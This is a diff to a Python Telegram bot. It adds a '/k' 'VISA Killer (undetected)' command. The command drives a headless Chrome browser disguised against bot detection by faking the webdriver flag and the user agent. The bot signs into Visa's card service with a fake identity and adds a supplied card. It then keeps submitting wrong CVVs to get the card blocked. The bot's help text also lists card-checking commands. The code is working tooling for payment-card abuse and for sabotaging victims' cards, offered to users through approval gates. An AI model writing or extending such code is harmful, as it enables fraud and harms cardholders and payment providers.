@@ -1077,6 +1077,54 @@ def create_killer_driver():
     
     return driver
 
+
+def create_undetected_chrome_driver():
+    """Create an undetected Chrome driver for /k command."""
+    from selenium import webdriver
+    from selenium.webdriver.chrome.service import Service
+    from fake_useragent import UserAgent
+
+    options = webdriver.ChromeOptions()
+    options.binary_location = "/usr/bin/google-chrome"
+
+    try:
+        ua = UserAgent(fallback="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").random
+    except:
+        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+    options.add_argument(f"user-agent={ua}")
+    options.add_argument("--headless=new")
+    options.add_argument("--no-sandbox")
+    options.add_argument("--disable-dev-shm-usage")
+    options.add_argument("--disable-gpu")
+    options.add_argument("--disable-extensions")
+    options.add_argument("--disable-blink-features=AutomationControlled")
+    options.add_argument("--disable-infobars")
+    options.add_argument("--disable-popup-blocking")
+    options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    options.add_experimental_option("useAutomationExtension", False)
+    options.add_experimental_option("prefs", {"profile.default_content_setting_values.automatic_downloads": 1})
+    options.set_capability("pageLoadStrategy", "eager")
+
+    service = Service(executable_path="/usr/bin/chromedriver")
+    driver = webdriver.Chrome(service=service, options=options)
+    driver.set_page_load_timeout(25)
+
+    try:
+        driver.execute_cdp_cmd(
+            "Page.addScriptToEvaluateOnNewDocument",
+            {
+                "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined});"
+                          "Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});"
+                          "Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});"
+                          "window.chrome = { runtime: {} };"
+            }
+        )
+    except Exception:
+        pass
+
+    return driver
+
 def killer_split_card(card_input: str) -> tuple:
     """Split card input into components"""
     parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
@@ -1218,7 +1266,7 @@ def close_all_selenium_browsers() -> int:
     return killed
 
 # ==== 2.3 Browser Command Health Tracking ====
-BROWSER_CMDS = ("kill", "kd", "ko", "zz", "dd", "st", "bt", "chk")
+BROWSER_CMDS = ("kill", "k", "kd", "ko", "zz", "dd", "st", "bt", "chk")
 _health_lock = threading.Lock()
 _health_stats = {cmd: {"success": 0, "failure": 0, "last_status": "idle", "last_time": None} for cmd in BROWSER_CMDS}
 _health_repair_threshold = 30  # Auto-repair when health drops below 30%
@@ -1320,7 +1368,7 @@ def get_health_bar(health: int) -> str:
 USER_DB_FILE = "users.json"
 
 # Commands we gate
-CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "dd", "st", "bt", "sort", "chk", "clean", "filter", "site")
+CMD_KEYS = ("bin", "kill", "k", "kd", "ko", "zz", "dd", "st", "bt", "sort", "chk", "clean", "filter", "site")
 
 # Per-command approvals, plus a legacy/global "all" set
 approved_cmds = {k: set() for k in CMD_KEYS}
@@ -3002,6 +3050,7 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• /chk <card> - Braintree Auth-2\n\n"
         "🗡️ *Visa Killer Commands:*\n"
         "• /kill <card> - VISA Killer\n"
+        "• /k <card> - VISA Killer #2 (undetected)\n"
         "• /kd <card> - VISA Killer #2\n"
         "• /ko <card> - VISA Killer #3\n"
         "• /zz <card> - Killed v5 (fast)\n"
@@ -3170,7 +3219,7 @@ async def health_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 return
             await _tg_call_with_retry(
                 update.message.reply_text,
-                f"⚠️ Unknown command `{cmd_to_reset}`. Use `/health reset` or `/health reset kd|ko|kill|zz|dd|st|bt|chk`.",
+                f"⚠️ Unknown command `{cmd_to_reset}`. Use `/health reset` or `/health reset kd|ko|k|kill|zz|dd|st|bt|chk`.",
                 parse_mode="Markdown",
                 reply_to_message_id=update.message.message_id,
             )
@@ -3450,6 +3499,7 @@ async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Visa Killer Gates
     parts.append("🗡️ *Visa Killer Gates*\n" + "\n".join([
         lock("/kill <card> — VISA Killer", "kill"),
+        lock("/k <card> — VISA Killer #2 (undetected)", "k"),
         lock("/kd <card> — VISA Killer #2", "kd"),
         lock("/ko <card> — VISA Killer #3", "ko"),
         lock("/zz <card> — Killed v5 (fast)", "zz"),
@@ -5378,6 +5428,201 @@ async def kd_cmd(update, context):
         "message_id": msg.message_id
     }
     Process(target=run_kd_process, args=(card_input, update_dict), daemon=True).start()
+
+# ==== 7.4.1 /k Command (NEW - UNDETECTED CHROME) ==== #
+def run_k_process(card_input, update_dict):
+    """K Mode - same as KD but using undetected Chrome"""
+    import random, traceback, time
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.webdriver.common.keys import Keys
+
+    start = time.time()
+    driver = None
+
+    def safe_click(el):
+        try:
+            driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
+            driver.execute_script("arguments[0].click();", el)
+        except:
+            pass
+
+    try:
+        killer_edit_message(update_dict, "⚙️ K Mode active — launching undetected session...")
+
+        driver = create_undetected_chrome_driver()
+        wait = WebDriverWait(driver, 4)
+
+        driver.get("https://src.visa.com/login")
+
+        # ================================
+        # COOKIE (UND DETECTED)
+        # ================================
+        try:
+            time.sleep(1.2)
+            cookie_btn = WebDriverWait(driver, 6).until(
+                EC.element_to_be_clickable((By.CSS_SELECTOR, "a.wscrOk"))
+            )
+            safe_click(cookie_btn)
+        except:
+            pass
+
+        # ================================
+        # STEP 1 — LOGIN
+        # ================================
+        identity = killer_get_fake_identity()
+
+        email = wait.until(EC.visibility_of_element_located((By.ID, "email-input")))
+        email.clear()
+        email.send_keys(identity["email"])
+
+        # Continue
+        safe_click(wait.until(EC.element_to_be_clickable(
+            (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
+        )))
+
+        # checkbox
+        checkbox = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.v-checkbox[type='checkbox']")))
+        safe_click(checkbox)
+        time.sleep(0.4)
+
+        # Next
+        next_btn = wait.until(EC.element_to_be_clickable(
+            (By.XPATH, "//button[.//div[normalize-space()='Next'] or .//span[normalize-space()='Next']]")
+        ))
+        safe_click(next_btn)
+
+        # ================================
+        # STEP 2 — CARD
+        # ================================
+        wait.until(EC.visibility_of_element_located((By.ID, "card-input")))
+
+        cc, mm, yy, real_cvv = killer_split_card(card_input)
+        bin_info, bin_flag = get_cached_bin_info(cc[:6])
+        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
+
+        wrong_cvv = killer_get_wrong_cvv(real_cvv)
+
+        card_box = wait.until(EC.visibility_of_element_located((By.ID, "card-input")))
+        card_box.clear()
+        card_box.send_keys(cc)
+
+        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
+
+        cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
+        cvv_field.send_keys(wrong_cvv)
+
+        # ================================
+        # STEP 3 — ADDRESS
+        # ================================
+        wait.until(EC.visibility_of_element_located((By.ID, "line1-input")))
+
+        try:
+            country = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
+            if "United States" not in (country.get_attribute("value") or ""):
+                country.click()
+                country.clear()
+                country.send_keys("United States")
+                country.send_keys(Keys.ENTER)
+        except:
+            pass
+
+        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
+        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])
+        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
+        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
+        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
+        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
+        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(identity["phone"])
+
+        # Add card
+        add_btn = wait.until(EC.element_to_be_clickable(
+            (By.XPATH, "//button[contains(@class,'styles-module__UMLP4q__submit') and .//div[normalize-space()='Add card']]")
+        ))
+        safe_click(add_btn)
+
+        killer_edit_message(update_dict, "✅ Step 3 complete — processed 1x")
+
+        # ================================
+        # STEP 4 — CVV LOOP (UND DETECTED)
+        # ================================
+        used = {wrong_cvv}
+        attempt = 1
+
+        for _ in range(5):
+            fake = killer_get_wrong_cvv(real_cvv)
+            while fake in used:
+                fake = killer_get_wrong_cvv(real_cvv)
+            used.add(fake)
+            attempt += 1
+
+            try:
+                cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
+                cvv_field.click()
+                cvv_field.send_keys(Keys.CONTROL + "a")
+                cvv_field.send_keys(fake)
+
+                safe_click(add_btn)
+                time.sleep(0.4)
+                killer_edit_message(update_dict, f"✅ Processed {attempt}x")
+            except:
+                killer_edit_message(update_dict, f"⚠️ Processed {attempt}x (retrying)")
+                pass
+
+        duration = round(time.time() - start, 2)
+
+        killer_edit_message(update_dict,
+            "💥 *K MODE REPORT* 💥\n\n"
+            f"• *Card:* `{short_card}`\n"
+            f"• *BIN:* `{bin_info}` {bin_flag}\n"
+            f"• *Mode:* `K Undetected`\n"
+            f"• *Processed:* `5x`\n"
+            f"• *Result:* `SUCCESS`\n"
+            f"• *Duration:* `{duration}s`\n"
+        )
+
+        record_cmd_success("k")
+
+    except Exception:
+        trace = traceback.format_exc()
+        killer_edit_message(update_dict, "❌ Request timeout, try again.")
+        killer_admin_report("k", trace, driver)
+        record_cmd_failure("k")
+
+    finally:
+        killer_cleanup_driver(driver)
+
+async def k_cmd(update, context):
+    uid = update.effective_user.id
+    if not is_approved(uid, "k"):
+        await update.message.reply_text("⛔ You are not approved to use /k", reply_to_message_id=update.message.message_id)
+        return
+    
+    if not is_cmd_enabled("k"):
+        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
+        return
+
+    raw_input = " ".join(context.args) if context.args else ""
+    card_input = extract_card_input(raw_input)
+    if not card_input:
+        await update.message.reply_text("❌ Invalid card.\nUse: `/k 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
+        return
+
+    try:
+        b6 = re.sub(r"[^0-9]", "", card_input)[:6]
+        if b6:
+            asyncio.create_task(_prefetch_bin_async(b6))
+    except Exception:
+        pass
+
+    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
+    update_dict = {
+        "user_id": uid,
+        "chat_id": update.effective_chat.id,
+        "message_id": msg.message_id
+    }
+    Process(target=run_k_process, args=(card_input, update_dict), daemon=True).start()
 
 # ==== 7.5 /ko Command (FINAL - FAST + STABLE VERSION) ==== #
 def run_ko_process(card_input, update_dict):
@@ -9740,6 +9985,7 @@ async def main():
 
         # Auth commands
         app.add_handler(CommandHandler("kill", kill_cmd))
+        app.add_handler(CommandHandler("k", k_cmd))
         app.add_handler(CommandHandler("kd", kd_cmd))
         app.add_handler(CommandHandler("ko", ko_cmd))
         app.add_handler(CommandHandler("zz", zz_cmd))
